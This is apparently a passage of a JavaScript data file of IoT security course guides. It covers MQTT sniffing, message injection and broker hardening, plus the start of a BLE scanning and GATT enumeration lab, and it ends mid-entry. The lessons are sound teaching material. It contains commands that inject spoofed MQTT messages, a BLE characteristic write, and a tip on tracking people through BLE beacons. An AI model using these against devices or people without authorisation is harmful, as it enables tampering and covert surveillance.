// ============================================================================
// Signal IoT Hacking — Build Guides (sg-63 through sg-72)
// Smart device attack and defense projects
// ============================================================================

window.SignalGuides = {

    'sg-63': {
        // Wokwi wave 4: N/A (Linux software) — broker + sniffer run in software, no device needed.
        simulator: { available: false, label: 'No Special Hardware — Runs on Any Linux', note: 'An MQTT broker (mosquitto) and a packet sniffer are <strong>pure software</strong> &mdash; run them on any Linux box or VM, publish/subscribe from a second terminal, and sniff the loopback/bridge traffic. No Raspberry Pi or IoT device required to learn the protocol.' },
        intro: '<p>MQTT (Message Queuing Telemetry Transport) is the most widely used protocol in IoT. Smart home devices, industrial sensors, building management systems, and medical devices all use MQTT to communicate. In this project you will set up an MQTT broker, publish and subscribe to topics, then sniff MQTT traffic with Wireshark to see why unencrypted MQTT is a security risk.</p>' +
               '<p>Most consumer IoT devices send MQTT messages in plaintext &mdash; sensor readings, commands, device status, and sometimes credentials. An attacker on the same network can read and inject MQTT messages without any authentication.</p>',
        wiring: '    Raspberry Pi running Mosquitto MQTT broker on port 1883',
        wiringNotes: '<p><strong>Port 1883:</strong> Standard MQTT (unencrypted). Port 8883: MQTT over TLS (encrypted). Most consumer IoT devices use 1883 with no authentication &mdash; the vulnerability we are demonstrating.</p>',
        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 400" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="sg63-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '<style>' +
            '@keyframes sg63-pulse{0%,100%{opacity:0.3}50%{opacity:1}}' +
            '@keyframes sg63-flow{0%{stroke-dashoffset:20}100%{stroke-dashoffset:0}}' +
            '</style>' +
            '</defs>' +
            '<rect width="720" height="400" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="380" fill="url(#sg63-grid)" rx="4"/>' +
            '<text x="360" y="30" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-63 MQTT BROKER SNIFFING</text>' +

            '<!-- Raspberry Pi (Mosquitto Broker) -->' +
            '<rect x="240" y="60" width="240" height="120" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<rect x="240" y="60" width="240" height="24" rx="8" fill="rgba(59,130,246,0.12)"/>' +
            '<rect x="240" y="76" width="240" height="8" fill="rgba(59,130,246,0.12)"/>' +
            '<text x="360" y="76" text-anchor="middle" fill="#60a5fa" font-size="10" font-weight="600">RASPBERRY PI</text>' +
            '<text x="360" y="100" text-anchor="middle" fill="#8b949e" font-size="8">Mosquitto MQTT Broker</text>' +
            '<text x="360" y="116" text-anchor="middle" fill="#22c55e" font-size="8">Port 1883 (plaintext)</text>' +
            '<text x="360" y="132" text-anchor="middle" fill="#a855f7" font-size="8">Port 8883 (TLS)</text>' +
            '<!-- Ethernet port -->' +
            '<rect x="460" y="150" width="24" height="14" rx="2" fill="#1a1f2b" stroke="#3b82f6" stroke-width="1"/>' +
            '<text x="472" y="160" text-anchor="middle" fill="#3b82f6" font-size="5">ETH</text>' +

            '<!-- IoT Device 1 — Temperature Sensor -->' +
            '<rect x="40" y="240" width="140" height="80" rx="6" fill="#1e2736" stroke="#22c55e" stroke-width="1.5"/>' +
            '<rect x="40" y="240" width="140" height="20" rx="6" fill="rgba(34,197,94,0.12)"/>' +
            '<rect x="40" y="254" width="140" height="6" fill="rgba(34,197,94,0.12)"/>' +
            '<text x="110" y="254" text-anchor="middle" fill="#4ade80" font-size="8" font-weight="600">TEMP SENSOR</text>' +
            '<text x="110" y="275" text-anchor="middle" fill="#8b949e" font-size="7">PUB: home/livingroom/temp</text>' +
            '<text x="110" y="290" text-anchor="middle" fill="#f97316" font-size="7">22.5 C (plaintext)</text>' +

            '<!-- IoT Device 2 — Door Sensor -->' +
            '<rect x="290" y="240" width="140" height="80" rx="6" fill="#1e2736" stroke="#22c55e" stroke-width="1.5"/>' +
            '<rect x="290" y="240" width="140" height="20" rx="6" fill="rgba(34,197,94,0.12)"/>' +
            '<rect x="290" y="254" width="140" height="6" fill="rgba(34,197,94,0.12)"/>' +
            '<text x="360" y="254" text-anchor="middle" fill="#4ade80" font-size="8" font-weight="600">DOOR SENSOR</text>' +
            '<text x="360" y="275" text-anchor="middle" fill="#8b949e" font-size="7">PUB: home/frontdoor/status</text>' +
            '<text x="360" y="290" text-anchor="middle" fill="#f97316" font-size="7">OPEN (plaintext)</text>' +

            '<!-- IoT Device 3 — Smart Plug -->' +
            '<rect x="540" y="240" width="140" height="80" rx="6" fill="#1e2736" stroke="#22c55e" stroke-width="1.5"/>' +
            '<rect x="540" y="240" width="140" height="20" rx="6" fill="rgba(34,197,94,0.12)"/>' +
            '<rect x="540" y="254" width="140" height="6" fill="rgba(34,197,94,0.12)"/>' +
            '<text x="610" y="254" text-anchor="middle" fill="#4ade80" font-size="8" font-weight="600">SMART PLUG</text>' +
            '<text x="610" y="275" text-anchor="middle" fill="#8b949e" font-size="7">SUB: home/plug1/command</text>' +
            '<text x="610" y="290" text-anchor="middle" fill="#f97316" font-size="7">ON / OFF (plaintext)</text>' +

            '<!-- Attacker / Wireshark -->' +
            '<rect x="540" y="80" width="140" height="70" rx="6" fill="#1e2736" stroke="#ef4444" stroke-width="1.5"/>' +
            '<rect x="540" y="80" width="140" height="20" rx="6" fill="rgba(239,68,68,0.12)"/>' +
            '<rect x="540" y="94" width="140" height="6" fill="rgba(239,68,68,0.12)"/>' +
            '<text x="610" y="94" text-anchor="middle" fill="#f87171" font-size="8" font-weight="600">WIRESHARK</text>' +
            '<text x="610" y="115" text-anchor="middle" fill="#8b949e" font-size="7">Sniffing port 1883</text>' +
            '<text x="610" y="130" text-anchor="middle" fill="#ef4444" font-size="7">ALL messages visible</text>' +

            '<!-- MQTT message wires (animated) -->' +
            '<line x1="110" y1="240" x2="300" y2="180" stroke="#22c55e" stroke-width="1.5" stroke-dasharray="6,3" style="animation:sg63-flow 1.5s linear infinite"/>' +
            '<line x1="360" y1="240" x2="360" y2="180" stroke="#22c55e" stroke-width="1.5" stroke-dasharray="6,3" style="animation:sg63-flow 1.5s linear infinite;animation-delay:0.3s"/>' +
            '<line x1="610" y1="240" x2="420" y2="180" stroke="#22c55e" stroke-width="1.5" stroke-dasharray="6,3" style="animation:sg63-flow 1.5s linear infinite;animation-delay:0.6s"/>' +

            '<!-- Wireshark sniff line -->' +
            '<line x1="480" y1="120" x2="540" y2="115" stroke="#ef4444" stroke-width="1.5" stroke-dasharray="4,2" style="animation:sg63-pulse 2s ease-in-out infinite"/>' +

            '<!-- Protocol callout -->' +
            '<rect x="40" y="350" width="300" height="40" rx="6" fill="rgba(239,68,68,0.06)" stroke="rgba(239,68,68,0.2)" stroke-width="0.5"/>' +
            '<text x="50" y="366" fill="#ef4444" font-size="8" font-weight="600">VULNERABILITY</text>' +
            '<text x="50" y="380" fill="#8b949e" font-size="7">Port 1883: No auth + no encryption = full read/inject</text>' +

            '<rect x="380" y="350" width="300" height="40" rx="6" fill="rgba(34,197,94,0.06)" stroke="rgba(34,197,94,0.2)" stroke-width="0.5"/>' +
            '<text x="390" y="366" fill="#22c55e" font-size="8" font-weight="600">DEFENSE</text>' +
            '<text x="390" y="380" fill="#8b949e" font-size="7">Port 8883: Auth + TLS = encrypted + authenticated</text>' +

            '</svg>' +
            '</div>',
        steps: [
            { title: 'Install Mosquitto MQTT Broker', content: '<p>Mosquitto is the most popular open-source MQTT broker. Install it on your Pi and it becomes the central message hub for all IoT devices.</p>', code: '# Install Mosquitto broker and client tools\nsudo apt install mosquitto mosquitto-clients -y\n\n# Start and enable\nsudo systemctl enable mosquitto\nsudo systemctl start mosquitto\n\n# Verify it is running on port 1883\nss -tlnp | grep 1883\n\n# Test with a quick publish/subscribe\n# Terminal 1 — subscribe to a topic:\nmosquitto_sub -t "test/hello" &\n\n# Terminal 2 — publish a message:\nmosquitto_pub -t "test/hello" -m "MQTT is working"\n\n# You should see "MQTT is working" appear in Terminal 1', language: 'Bash', tip: '<strong>Topics:</strong> MQTT uses a topic hierarchy like a file path: <code>home/livingroom/temperature</code>. Subscribers listen on topics (with wildcards: <code>home/#</code> = everything under home). Publishers send to specific topics. The broker routes messages from publishers to subscribers.' },
            { title: 'Simulate IoT Devices', content: '<p>Create simulated IoT devices that publish sensor data to the broker.</p>', code: '# Simulate a temperature sensor publishing every 5 seconds\nwhile true; do\n  TEMP=$(echo "scale=1; 20 + $RANDOM % 10" | bc)\n  mosquitto_pub -t "home/livingroom/temperature" -m "$TEMP"\n  echo "Published: $TEMP C"\n  sleep 5\ndone &\n\n# Simulate a door sensor\nmosquitto_pub -t "home/frontdoor/status" -m "OPEN"\nsleep 3\nmosquitto_pub -t "home/frontdoor/status" -m "CLOSED"\n\n# Simulate a smart plug command\nmosquitto_pub -t "home/plug1/command" -m "ON"\n\n# Subscribe to ALL topics to see everything:\nmosquitto_sub -t "#" -v\n# The -v flag shows the topic name with each message', language: 'Bash', tip: null },
            { title: 'Sniff MQTT with Wireshark', content: '<p>Capture MQTT traffic with Wireshark to see the messages in plaintext. This demonstrates why unencrypted MQTT is a privacy and security disaster.</p>', code: '# Capture on the loopback interface (since broker is local)\nsudo tshark -i lo -f "port 1883" -Y mqtt -T fields \\\n  -e frame.time -e mqtt.topic -e mqtt.msg \\\n  -c 20\n\n# Or use full Wireshark GUI:\n# sudo wireshark &\n# Capture on lo interface, filter: mqtt\n# You will see CONNECT, SUBSCRIBE, PUBLISH messages\n# All topic names and message payloads are in cleartext\n\n# For network capture (real IoT devices on your LAN):\nsudo tshark -i eth0 -f "port 1883" -Y mqtt -T fields \\\n  -e ip.src -e ip.dst -e mqtt.topic -e mqtt.msg', language: 'Bash', tip: '<strong>What you see:</strong> Every MQTT message is visible &mdash; topic names reveal the device type and location, payloads reveal sensor values, and CONNECT packets may reveal credentials if the broker uses password auth without TLS. This is exactly what an attacker on the same network sees.' },
            { title: 'Inject Malicious MQTT Messages', content: '<p>Demonstrate that anyone on the network can publish to any topic. This is command injection against IoT devices.</p>', code: '# Inject a fake temperature reading\nmosquitto_pub -t "home/livingroom/temperature" -m "999.9"\n# Any subscriber trusting this data now shows 999.9 degrees\n\n# Inject a command to a smart plug\nmosquitto_pub -t "home/plug1/command" -m "OFF"\n# If a real smart plug is subscribed, it turns off\n\n# Inject a fake door status\nmosquitto_pub -t "home/frontdoor/status" -m "CLOSED"\n# Security system thinks the door is closed when it is not\n\n# The lesson: without authentication, ANY client can\n# publish to ANY topic. There is no access control.\n\n# === FIX: Enable authentication ===\n# Create a password file:\nsudo mosquitto_passwd -c /etc/mosquitto/passwd iotuser\n# Enter a password\n\n# Update mosquitto config:\necho "allow_anonymous false" | sudo tee -a /etc/mosquitto/mosquitto.conf\necho "password_file /etc/mosquitto/passwd" | sudo tee -a /etc/mosquitto/mosquitto.conf\nsudo systemctl restart mosquitto\n\n# Now connections require credentials:\nmosquitto_pub -t "test" -m "hello" -u iotuser -P yourpassword', language: 'Bash', tip: '<strong>Real-world impact:</strong> Shodan.io indexes thousands of MQTT brokers exposed to the internet with no authentication. Researchers have found medical device data, building management controls, and industrial sensor data all accessible to anyone. The fix is authentication + TLS. The reality is most IoT deployments skip both.' },
            { title: 'Secure the Broker with TLS', content: '<p>Configure Mosquitto with TLS encryption so all MQTT traffic is encrypted in transit.</p>', code: '# Generate self-signed certificates (for lab use)\nsudo mkdir -p /etc/mosquitto/certs\ncd /etc/mosquitto/certs\n\n# Generate CA key and certificate\nsudo openssl req -new -x509 -days 365 -extensions v3_ca \\\n  -keyout ca.key -out ca.crt \\\n  -subj "/CN=Hexworth-MQTT-CA"\n\n# Generate server key and CSR\nsudo openssl genrsa -out server.key 2048\nsudo openssl req -new -key server.key -out server.csr \\\n  -subj "/CN=localhost"\n\n# Sign server cert with CA\nsudo openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key \\\n  -CAcreateserial -out server.crt -days 365\n\n# Configure Mosquitto for TLS\nsudo tee -a /etc/mosquitto/mosquitto.conf << TLSEOF\n\n# TLS configuration\nlistener 8883\ncafile /etc/mosquitto/certs/ca.crt\ncertfile /etc/mosquitto/certs/server.crt\nkeyfile /etc/mosquitto/certs/server.key\nTLSEOF\n\nsudo systemctl restart mosquitto\n\n# Test TLS connection\nmosquitto_pub -t "test/tls" -m "encrypted" \\\n  -p 8883 --cafile /etc/mosquitto/certs/ca.crt \\\n  -u iotuser -P yourpassword\n\n# Sniff again — now Wireshark shows TLS handshake, no cleartext\nsudo tshark -i lo -f "port 8883" -c 10\n# You see TLS Client Hello, Server Hello — no readable MQTT data', language: 'Bash', tip: '<strong>Defense in depth:</strong> Authentication prevents unauthorized access. TLS prevents eavesdropping. Both are needed. Authentication without TLS means passwords are sent in cleartext. TLS without authentication means anyone with the CA cert can connect. Always use both together.' }
        ],
        testing: '<p><strong>Verification checklist:</strong></p>' +
                 '<ul>' +
                 '<li>Mosquitto running on port 1883</li>' +
                 '<li>Publish/subscribe works between terminals</li>' +
                 '<li>Wireshark shows MQTT messages in plaintext on port 1883</li>' +
                 '<li>Message injection works (can publish to any topic)</li>' +
                 '<li>Authentication enabled: anonymous connections rejected</li>' +
                 '<li>TLS enabled on port 8883: Wireshark shows encrypted traffic</li>' +
                 '</ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>Mosquitto fails to start after config changes:</strong> Run <code>mosquitto -c /etc/mosquitto/mosquitto.conf -v</code> in the foreground to see the exact error. Common causes: duplicate listener directives, missing cert files, or incorrect file permissions on the password file.</li>' +
                         '<li><strong>mosquitto_pub/sub "Connection Refused":</strong> After enabling authentication, every command needs <code>-u username -P password</code>. If you get "not authorised" instead of "refused", the credentials are wrong but the broker is reachable.</li>' +
                         '<li><strong>Wireshark shows no MQTT packets:</strong> Make sure you are capturing on the correct interface. Use <code>lo</code> (loopback) if broker and client are on the same Pi. Use <code>eth0</code> or <code>wlan0</code> if the client is on a different machine. Also verify the display filter is <code>mqtt</code>, not <code>MQTT</code>.</li>' +
                         '<li><strong>TLS handshake fails ("SSL routines:ssl3_get_server_certificate"):</strong> The CA certificate passed to <code>--cafile</code> must be the same CA that signed the server cert. If you regenerated certs, make sure both the broker config and the client command point to the matching <code>ca.crt</code>.</li>' +
                         '<li><strong>tshark "permission denied" on interface:</strong> Run with <code>sudo</code>. Alternatively, add your user to the <code>wireshark</code> group: <code>sudo usermod -aG wireshark $USER</code> and log out/in.</li>' +
                         '<li><strong>Simulated sensor script floods the terminal:</strong> The background loop (<code>while true</code>) keeps running after you close the terminal. Kill it with <code>pkill -f mosquitto_pub</code> or find and kill the specific PID.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: Topic ACL Enforcement</strong> &mdash; Configure Mosquitto Access Control Lists (ACLs) so that user "sensor" can only publish to <code>home/+/temperature</code> and user "controller" can only subscribe to <code>home/#</code>. Test that cross-topic access is denied. Document the ACL file syntax.</p>' +
                    '<p><strong>Challenge 2: MQTT Fuzzer</strong> &mdash; Write a Python script using the <code>paho-mqtt</code> library that publishes randomized payloads (oversized messages, malformed JSON, null bytes, unicode edge cases) to stress-test the broker. Monitor broker stability and log any crashes or unexpected behavior.</p>' +
                    '<p><strong>Challenge 3: Retained Message Poisoning</strong> &mdash; Explore MQTT retained messages (<code>-r</code> flag). Publish a retained message to a topic, then subscribe and observe that new subscribers receive the poisoned value immediately. Write a cleanup script that clears all retained messages by publishing empty payloads with the retain flag.</p>',

        commonMistakes: [
            {
                title: 'Publishing Without Subscribing First',
                correct: 'Open a subscriber terminal first with <code>mosquitto_sub -t "test/hello"</code>, then publish from a second terminal. The subscriber must be running before the message is sent.',
                incorrect: 'Publishing a message and then starting the subscriber, expecting to see the message retroactively.',
                consequence: 'MQTT is real-time &mdash; messages are delivered only to currently connected subscribers (unless retained). You see nothing and assume the broker is broken when it is working correctly.'
            },
            {
                title: 'Enabling TLS Without Disabling Port 1883',
                correct: 'After adding the TLS listener on port 8883, explicitly disable or remove the plaintext listener on port 1883 if you want to enforce encryption.',
                incorrect: 'Adding a TLS listener on 8883 while leaving the unauthenticated plaintext listener on 1883 active.',
                consequence: 'Clients can bypass TLS entirely by connecting to port 1883. You have encryption available but not enforced. An attacker simply connects to the unencrypted port.'
            },
            {
                title: 'Using the Same Password for Mosquitto and System Login',
                correct: 'Use a unique, dedicated password for the Mosquitto broker that is different from your system login and other services.',
                incorrect: 'Setting the Mosquitto password to the same value as your Pi user password or reusing credentials from other services.',
                consequence: 'If an attacker sniffs MQTT traffic before TLS is enabled, they capture the Mosquitto password. If it matches your system login, they now have SSH access to your Pi.'
            }
        ]
    },

    'sg-64': {
        // Wokwi wave 4: NO SIM — real BLE radio.
        simulator: { available: false, note: 'Scanning and enumerating <strong>BLE</strong> devices needs a real Bluetooth radio near real peripherals &mdash; Wokwi does not implement Bluetooth. Learn the GAP/GATT enumeration here; run it with a real adapter.' },
        intro: '<p>Bluetooth Low Energy (BLE) is everywhere &mdash; fitness trackers, smart locks, medical devices, beacons, and wireless sensors. With your Raspberry Pi\'s built-in Bluetooth, you can scan for BLE devices, enumerate their services and characteristics, and read/write data attributes. This is the foundation of BLE security testing.</p>',
        wiring: '    Raspberry Pi with built-in Bluetooth -> BLE devices in range',
        wiringNotes: '<p><strong>Range:</strong> BLE range is typically 10&ndash;30 meters indoors. Some devices (beacons) can reach 100m+ outdoors. Your Pi\'s built-in Bluetooth antenna is adequate for nearby devices.</p>',
        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 400" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="sg64-grid" width="20" height="20" patternUnits="userSpaceOnUse"><rect width="20" height="20" fill="none"/><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '<style>' +
            '@keyframes sg64-scan{0%{r:20;opacity:0.8}100%{r:120;opacity:0}}' +
            '@keyframes sg64-blink{0%,100%{opacity:0.2}50%{opacity:1}}' +
            '</style>' +
            '</defs>' +
            '<rect width="720" height="400" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="380" fill="url(#sg64-grid)" rx="4"/>' +
            '<text x="360" y="30" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-64 BLE RECONNAISSANCE</text>' +

            '<!-- Raspberry Pi (BLE Scanner) -->' +
            '<rect x="260" y="130" width="200" height="140" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<rect x="260" y="130" width="200" height="24" rx="8" fill="rgba(59,130,246,0.12)"/>' +
            '<rect x="260" y="146" width="200" height="8" fill="rgba(59,130,246,0.12)"/>' +
            '<text x="360" y="146" text-anchor="middle" fill="#60a5fa" font-size="10" font-weight="600">RASPBERRY PI</text>' +
            '<text x="360" y="170" text-anchor="middle" fill="#8b949e" font-size="8">Built-in Bluetooth 5.0</text>' +
            '<text x="360" y="186" text-anchor="middle" fill="#a855f7" font-size="8">hcitool lescan + Bleak</text>' +
            '<text x="360" y="206" text-anchor="middle" fill="#22c55e" font-size="7">GATT Enumeration</text>' +
            '<text x="360" y="220" text-anchor="middle" fill="#22c55e" font-size="7">Service/Characteristic Read</text>' +
            '<text x="360" y="240" text-anchor="middle" fill="#f97316" font-size="7">No Pairing Required</text>' +

            '<!-- BLE scan waves -->' +
            '<circle cx="360" cy="200" r="20" fill="none" stroke="#3b82f6" stroke-width="0.8" opacity="0.6" style="animation:sg64-scan 3s ease-out infinite"/>' +
            '<circle cx="360" cy="200" r="20" fill="none" stroke="#3b82f6" stroke-width="0.8" opacity="0.6" style="animation:sg64-scan 3s ease-out infinite;animation-delay:1s"/>' +
            '<circle cx="360" cy="200" r="20" fill="none" stroke="#3b82f6" stroke-width="0.8" opacity="0.6" style="animation:sg64-scan 3s ease-out infinite;animation-delay:2s"/>' +

            '<!-- BLE Device 1 — Fitness Tracker -->' +
            '<rect x="40" y="50" width="130" height="65" rx="6" fill="#1e2736" stroke="#22c55e" stroke-width="1.5"/>' +
            '<rect x="40" y="50" width="130" height="18" rx="6" fill="rgba(34,197,94,0.12)"/>' +
            '<rect x="40" y="62" width="130" height="6" fill="rgba(34,197,94,0.12)"/>' +
            '<text x="105" y="63" text-anchor="middle" fill="#4ade80" font-size="7" font-weight="600">FITNESS TRACKER</text>' +
            '<text x="105" y="80" text-anchor="middle" fill="#8b949e" font-size="6">Battery: 0x180F</text>' +
            '<text x="105" y="92" text-anchor="middle" fill="#8b949e" font-size="6">Heart Rate: 0x180D</text>' +
            '<text x="105" y="104" text-anchor="middle" fill="#f97316" font-size="6">RSSI: -42 dBm</text>' +

            '<!-- BLE Device 2 — Smart Lock -->' +
            '<rect x="550" y="50" width="130" height="65" rx="6" fill="#1e2736" stroke="#ef4444" stroke-width="1.5"/>' +
            '<rect x="550" y="50" width="130" height="18" rx="6" fill="rgba(239,68,68,0.12)"/>' +
            '<rect x="550" y="62" width="130" height="6" fill="rgba(239,68,68,0.12)"/>' +
            '<text x="615" y="63" text-anchor="middle" fill="#f87171" font-size="7" font-weight="600">SMART LOCK</text>' +
            '<text x="615" y="80" text-anchor="middle" fill="#8b949e" font-size="6">Custom UUID (128-bit)</text>' +
            '<text x="615" y="92" text-anchor="middle" fill="#ef4444" font-size="6">Writable: No Auth!</text>' +
            '<text x="615" y="104" text-anchor="middle" fill="#f97316" font-size="6">RSSI: -58 dBm</text>' +

            '<!-- BLE Device 3 — Smart Bulb -->' +
            '<rect x="40" y="300" width="130" height="65" rx="6" fill="#1e2736" stroke="#22c55e" stroke-width="1.5"/>' +
            '<rect x="40" y="300" width="130" height="18" rx="6" fill="rgba(34,197,94,0.12)"/>' +
            '<rect x="40" y="312" width="130" height="6" fill="rgba(34,197,94,0.12)"/>' +
            '<text x="105" y="313" text-anchor="middle" fill="#4ade80" font-size="7" font-weight="600">SMART BULB</text>' +
            '<text x="105" y="332" text-anchor="middle" fill="#8b949e" font-size="6">No Pairing Required</text>' +
            '<text x="105" y="344" text-anchor="middle" fill="#8b949e" font-size="6">Write &#8594; Color Change</text>' +
            '<text x="105" y="356" text-anchor="middle" fill="#f97316" font-size="6">RSSI: -35 dBm</text>' +

            '<!-- BLE Device 4 — Phone -->' +
            '<rect x="550" y="300" width="130" height="65" rx="6" fill="#1e2736" stroke="#a855f7" stroke-width="1.5"/>' +
            '<rect x="550" y="300" width="130" height="18" rx="6" fill="rgba(168,85,247,0.12)"/>' +
            '<rect x="550" y="312" width="130" height="6" fill="rgba(168,85,247,0.12)"/>' +
            '<text x="615" y="313" text-anchor="middle" fill="#c084fc" font-size="7" font-weight="600">MOBILE PHONE</text>' +
            '<text x="615" y="332" text-anchor="middle" fill="#8b949e" font-size="6">MAC Randomized</text>' +
            '<text x="615" y="344" text-anchor="middle" fill="#8b949e" font-size="6">Apple/Google Beacon</text>' +
            '<text x="615" y="356" text-anchor="middle" fill="#a855f7" font-size="6">RSSI: -67 dBm</text>' +

            '<!-- Connection lines -->' +
            '<line x1="170" y1="82" x2="260" y2="160" stroke="#22c55e" stroke-width="1" stroke-dasharray="4,3" style="animation:sg64-blink 2s ease-in-out infinite"/>' +
            '<line x1="550" y1="82" x2="460" y2="160" stroke="#ef4444" stroke-width="1" stroke-dasharray="4,3" style="animation:sg64-blink 2s ease-in-out infinite;animation-delay:0.5s"/>' +
            '<line x1="170" y1="332" x2="260" y2="240" stroke="#22c55e" stroke-width="1" stroke-dasharray="4,3" style="animation:sg64-blink 2s ease-in-out infinite;animation-delay:1s"/>' +
            '<line x1="550" y1="332" x2="460" y2="240" stroke="#a855f7" stroke-width="1" stroke-dasharray="4,3" style="animation:sg64-blink 2s ease-in-out infinite;animation-delay:1.5s"/>' +

            '<!-- GATT callout -->' +
            '<rect x="200" y="350" width="320" height="40" rx="6" fill="rgba(59,130,246,0.06)" stroke="rgba(59,130,246,0.2)" stroke-width="0.5"/>' +
            '<text x="210" y="366" fill="#60a5fa" font-size="8" font-weight="600">GATT PROFILE</text>' +
            '<text x="210" y="380" fill="#8b949e" font-size="7">Services &#8594; Characteristics &#8594; Read/Write/Notify properties</text>' +

            '</svg>' +
            '</div>',
        steps: [
            { title: 'Scan for BLE Devices', content: '<p>Use <code>bluetoothctl</code> and <code>hcitool</code> to discover nearby BLE devices.</p>', code: '# Enable Bluetooth\nsudo systemctl start bluetooth\nsudo hciconfig hci0 up\n\n# Scan for BLE devices (10 second scan)\nsudo hcitool lescan --duplicates &\nSCAN_PID=$!\nsleep 10\nsudo kill $SCAN_PID 2>/dev/null\n\n# Or use bluetoothctl (interactive):\nbluetoothctl\n# [bluetooth]# scan on\n# Wait for devices to appear...\n# [bluetooth]# scan off\n# [bluetooth]# devices\n# [bluetooth]# quit\n\n# Python BLE scanner (more detail):\npip3 install bleak\npython3 << \'PYEOF\'\nimport asyncio\nfrom bleak import BleakScanner\n\nasync def scan():\n    devices = await BleakScanner.discover(timeout=10)\n    print(f"Found {len(devices)} BLE devices:\\n")\n    for d in sorted(devices, key=lambda x: x.rssi, reverse=True):\n        print(f"  {d.address}  RSSI:{d.rssi:>4}  {d.name or \'(unnamed)\'}")\n\nasyncio.run(scan())\nPYEOF', language: 'Bash', tip: '<strong>What you will find:</strong> Phones (advertising for AirDrop/Nearby Share), fitness bands, smart watches, wireless earbuds, smart home sensors, BLE beacons, tire pressure sensors, and more. Many advertise their name and capabilities publicly.' },
            { title: 'Enumerate Services and Characteristics', content: '<p>Connect to a BLE device and discover its GATT (Generic Attribute Profile) services. Each service contains characteristics &mdash; readable/writable data points.</p>', code: '# Connect and enumerate with Python (bleak)\npython3 << \'PYEOF\'\nimport asyncio\nfrom bleak import BleakClient\n\n# Replace with a device address from the scan\nADDRESS = "AA:BB:CC:DD:EE:FF"\n\nasync def enumerate():\n    async with BleakClient(ADDRESS) as client:\n        print(f"Connected: {client.is_connected}")\n        print(f"MTU: {client.mtu_size}\\n")\n        \n        for service in client.services:\n            print(f"Service: {service.uuid}")\n            print(f"  Description: {service.description}")\n            for char in service.characteristics:\n                props = ", ".join(char.properties)\n                print(f"  Char: {char.uuid} [{props}]")\n                print(f"    Description: {char.description}")\n                \n                if "read" in char.properties:\n                    try:\n                        val = await client.read_gatt_char(char.uuid)\n                        print(f"    Value: {val.hex()} ({val})")\n                    except: pass\n\nasyncio.run(enumerate())\nPYEOF\n\n# Common GATT services you will find:\n# 0x1800 — Generic Access (device name, appearance)\n# 0x1801 — Generic Attribute\n# 0x180a — Device Information (manufacturer, model, firmware)\n# 0x180f — Battery Service (battery level)\n# 0x1809 — Health Thermometer', language: 'Bash', tip: '<strong>UUID format:</strong> Standard services use 16-bit UUIDs (0x180a). Custom/proprietary services use 128-bit UUIDs. If you see a 128-bit UUID, the device has custom functionality that may be undocumented &mdash; a target for reverse engineering.' },
            { title: 'Read and Write Characteristics', content: '<p>Read data from BLE characteristics and attempt writes to test access control.</p>', code: '# Read battery level (if device exposes it)\npython3 -c "\nimport asyncio\nfrom bleak import BleakClient\n\nADDRESS = \'AA:BB:CC:DD:EE:FF\'\nBATTERY_UUID = \'00002a19-0000-1000-8000-00805f9b34fb\'  # Battery Level\n\nasync def read_battery():\n    async with BleakClient(ADDRESS) as client:\n        val = await client.read_gatt_char(BATTERY_UUID)\n        print(f\'Battery: {val[0]}%\')\n\nasyncio.run(read_battery())\n"\n\n# Write to a characteristic (if writable)\n# Example: set a device name or configuration value\n# python3 -c "\n# import asyncio\n# from bleak import BleakClient\n# async def write():\n#     async with BleakClient(ADDRESS) as client:\n#         await client.write_gatt_char(CHAR_UUID, b\'\\x01\')  # send 0x01\n#         print(\'Written successfully\')\n# asyncio.run(write())\n# "\n\n# WARNING: Only write to devices you own.\n# Writing to unknown characteristics can brick devices.', language: 'Bash', tip: '<strong>Security implication:</strong> Many BLE devices have writable characteristics with no authentication. A smart lock might accept an "unlock" command from any device that connects. A medical sensor might allow configuration changes. The BLE pairing process (bonding) is supposed to prevent this, but many devices skip pairing entirely for convenience.' },
            { title: 'BLE Security Analysis', content: '<p>Analyze the security posture of BLE devices you discover.</p>', code: '# Check if devices require pairing (bonding)\n# Devices that connect without pairing = no authentication\n\n# Check advertisement data for sensitive information\npython3 << \'PYEOF\'\nimport asyncio\nfrom bleak import BleakScanner\n\nasync def detailed_scan():\n    devices = await BleakScanner.discover(timeout=15, return_adv=True)\n    for address, (device, adv) in devices.items():\n        if adv.local_name:\n            print(f"\\n{address} — {adv.local_name}")\n            print(f"  RSSI: {adv.rssi} dBm")\n            print(f"  TX Power: {adv.tx_power}")\n            if adv.service_uuids:\n                print(f"  Services: {adv.service_uuids}")\n            if adv.manufacturer_data:\n                for mfr_id, data in adv.manufacturer_data.items():\n                    print(f"  Manufacturer {mfr_id:#06x}: {data.hex()}")\n            if adv.service_data:\n                for uuid, data in adv.service_data.items():\n                    print(f"  Service data [{uuid}]: {data.hex()}")\n\nasyncio.run(detailed_scan())\nPYEOF\n\n# Manufacturer data often reveals:\n# - Device model and firmware version\n# - Apple/Google tracking beacons\n# - Battery status\n# - Sensor readings broadcast publicly', language: 'Bash', tip: '<strong>BLE tracking:</strong> Many BLE devices broadcast a fixed MAC address, which means they can be tracked. Apple and Android have implemented MAC randomization to prevent this, but many IoT devices still use fixed addresses. Walk around with your scanner and you can track which devices (and therefore which people) are in a given area.' }
        ],
        testing: '<p><strong>Verification checklist:</strong></p>' +
                 '<ul>' +
                 '<li>BLE scan discovers nearby devices with names and RSSI</li>' +
                 '<li>Connected to at least one device and enumerated services</li>' +
